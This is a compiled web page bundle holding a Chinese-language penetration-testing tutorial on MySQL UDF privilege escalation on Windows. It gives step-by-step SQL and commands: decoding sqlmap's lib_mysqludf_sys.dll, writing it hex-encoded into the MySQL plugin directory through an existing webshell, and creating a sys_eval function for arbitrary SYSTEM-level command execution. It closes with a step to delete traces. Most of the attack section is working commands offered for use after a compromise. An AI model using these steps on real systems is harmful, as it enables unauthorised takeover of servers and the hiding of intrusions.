import{_ as s}from"./plugin-vue_export-helper-c27b6911.js";import{o as e,c as n,e as a}from"./app-f332b8da.js";const l="/assets/image-20230824192859006-64bbc8b2.png",t="data:image/png;base64,",d="/assets/image-20230824200335269-ac0ef8a7.png",i="data:image/png;base64,",A="/assets/image-20230824201054028-4bfe9d66.png",r="/assets/image-20230824210201254-a39a940d.png",o={},p=a(`<h1 id="什么是udf" tabindex="-1"><a class="header-anchor" href="#什么是udf" aria-hidden="true">#</a> 什么是UDF</h1><blockquote><p>udf 全称为：<code>user defined function</code>，意为用户自定义函数；用户可以添加自定义的新函数到Mysql中，以达到功能的扩充，调用方式与一般系统自带的函数相同，例如 <code>contact()</code>，<code>user()</code>，<code>version()</code>等函数。</p><p>udf 文件后缀一般为 dll，由C、C++编写</p></blockquote><h1 id="udf在渗透中的作用" tabindex="-1"><a class="header-anchor" href="#udf在渗透中的作用" aria-hidden="true">#</a> UDF在渗透中的作用</h1><blockquote><p>在一般渗透过程中，拿下一台windows服务器的webshell时，由于webshell权限较低，有些操作无法进行，而此时本地恰好存在mysql数据库，那么udf可能就派上用场了；由于windows安装的mysql进程一般都拥有管理员权限，这就意味着用户自定义的函数也拥有管理员权限，我们也就拥有了执行管理员命令的权限，这时新建管理员用户等操作也就轻而易举了，大多数人称为这一操作为udf提权，其实表达不够准确，应该称为通过mysql获得管理员权限。</p></blockquote><h1 id="必备的条件" tabindex="-1"><a class="header-anchor" href="#必备的条件" aria-hidden="true">#</a> 必备的条件</h1><blockquote><ul><li>获得一个数据库账号，拥有对MySQL的insert和delete权限。以root为佳。</li><li>拥有将udf.dll写入相应目录的权限。</li></ul></blockquote><h1 id="数据库版本问题" tabindex="-1"><a class="header-anchor" href="#数据库版本问题" aria-hidden="true">#</a> 数据库版本问题</h1><blockquote><p>udf利用的其中一步，是要将我们的xxx.dll文件上传到mysql检索目录中，mysql各版本的检索目录有所不同：</p><table><thead><tr><th>版本</th><th>路径</th></tr></thead><tbody><tr><td>MySQL &lt; 5.0</td><td>导出路径随意；</td></tr><tr><td>5.0 &lt;= MySQL&lt; 5.1</td><td>需要导出至目标服务器的系统目录（如：c:/windows/system32/）</td></tr><tr><td>5.1 &lt; MySQL</td><td>必须导出到MySQL安装目录下的lib\\plugin文件夹下</td></tr></tbody></table><p><strong>一般Lib、Plugin文件夹需要手工建立（可用NTFS ADS流模式突破进而创建文件夹）</strong></p></blockquote><h1 id="本地复现" tabindex="-1"><a class="header-anchor" href="#本地复现" aria-hidden="true">#</a> 本地复现</h1><blockquote><p><strong>1、获取Mysql安装路径</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>select @basedir
1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>2、查看可操作路径</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>show global variables like &quot;%secure%&quot;
1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>secure_file_priv值为null，表示mysql不允许导入导出，此时我们只能通过别的方法将udf.dll写入安装路径</strong></p><p><strong>3、查看plugin目录路径</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>select @@plugin_dir
1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>4、将dll上传方式推荐几种</strong></p><p>将dll上传到安装路径的方式：</p><p>通过webshell上传</p><p>以hex方式直接上传</p><p><strong>sqlmap中现有的udf文件，分为32位和64位，一定要选择对版本，获取sqlmap的udf方式</strong></p><p><strong>5、sqlmap中udf获取方式</strong></p><p>自动化注入工具Sqlmap已经集成了此功能。</p><p><strong>在 \\sqlmap\\data\\udf\\mysql\\windows\\64目录下存放着lib_mysqludf_sys.dll_</strong></p><p><img src="`+l+`" alt="image-20230824192859006"></p><p>但是为了防止误杀，这个文件是二进制文件，需要编码使用</p><p><strong>可以利用sqlmap 自带的解码工具cloak.py，在sqlmap\\extra\\cloak中打开命令行，来对lib_mysqludf_sys.dll_进行解码在，然后在直接利用，输入下面的</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python cloak.py -d -i C:\\sqlmap\\data\\udf\\mysql\\windows\\64\\lib_mysqludf_sys.dll_
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+t+'" alt="image-20230824193426024"></p><p>接着就会在\\sqlmap\\data\\udf\\mysql\\windows\\64目录下生成一个dll的文件<strong>lib_mysqludf_sys.dll</strong>，这个我们就可以直接拿来利用</p><p>攻击者可以利用lib_mysqludf_sys提供的函数执行系统命令。</p><p>函数：</p><p><strong>sys_eval，执行任意命令，并将输出返回。</strong></p><p><strong>sys_exec，执行任意命令，并将退出码返回。</strong></p><p><strong>sys_get，获取一个环境变量。</strong></p><p><strong>sys_set，创建或修改一个环境变量。</strong></p><p><strong>注意：攻击过程中，首先需要将lib_mysqludf_sys ( 目标为windows时，lib_mysqludf_sys.dll；linux时，lib_mysqludf_sys.so）上传到数据库能访问的路径下。</strong></p><p><img src="'+d+`" alt="image-20230824200335269"></p><p>把文件复制到plugin目录下</p><p>然后再数据库中输入</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>create function sys_eval returns string soname &#39;udf.dll&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+i+`" alt="image-20230824200955751"></p><ul><li><p>然后就可以任意命令执行了</p></li><li><p><strong>sys_eval，执行任意命令，并将输出返回。</strong></p><p><strong>sys_exec，执行任意命令，并将退出码返回。</strong></p><p><strong>sys_get，获取一个环境变量。</strong></p><p><strong>sys_set，创建或修改一个环境变量。</strong></p></li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>select sys_eval(&#39;ipconfig&#39;)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+A+`" alt="image-20230824201054028"></p></blockquote><h1 id="实战复现" tabindex="-1"><a class="header-anchor" href="#实战复现" aria-hidden="true">#</a> 实战复现</h1><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>select hex(load_file(&#39;C:/udf.dll&#39;)) into dumpfile &#39;c:/udf.txt&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><blockquote><p>利用mysql的hex函数，把udf.dll转换为十六进制</p><p><img src="`+r+`" alt="image-20230824210201254"></p><p><strong>接下来就是把本地的udf16进制形式通过我们已经获得的webshell传到目标主机上。</strong></p><p><strong>一、新建一个表，名为udftmp，用于存放本地传来的udf文件的内容。</strong></p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">create</span> <span class="token keyword">table</span> udftmp <span class="token punctuation">(</span>c <span class="token keyword">BLOB</span><span class="token punctuation">)</span>
<span class="token number">1</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>二、在udftmp中写入udf文件内容</strong></p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> udftmp <span class="token keyword">values</span><span class="token punctuation">(</span>unhex<span class="token punctuation">(</span><span class="token string">&#39;udf文件的16进制格式&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token number">1</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>三、将udf文件内容传入新建的udf文件中，路径根据自己的@@plugin_dir修改 //对于mysql小于5.1的，导出目录为</strong>C:\\Windows\\或C:\\Windows\\System32\\</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> c <span class="token keyword">from</span> udftmp <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> <span class="token string">&#39;D:/phpstudy8/Extensions/MySQL5.7.26/lib/plugin/udf.dll&#39;</span>
<span class="token number">1</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>四、执行下面语句，就可以system权限下命令任意执行，这电脑就沦陷了，执行命令上面已经说过，就不复述了</strong></p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">create</span> <span class="token keyword">function</span> sys_eval <span class="token keyword">returns</span> string <span class="token keyword">soname</span> <span class="token string">&#39;udf.dll&#39;</span>
<span class="token number">1</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>五、删除痕迹，做好事不留名</strong></p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span> udftmp
<span class="token number">1</span>
<span class="token keyword">SELECT</span> sys_eval<span class="token punctuation">(</span><span class="token string">&#39;ipconfig&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
返回网卡信息
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></blockquote>`,13),c=[p];function u(g,m){return e(),n("div",null,c)}const b=s(o,[["render",u],["__file","UDF提权命令执行.html.vue"]]);export{b as default};
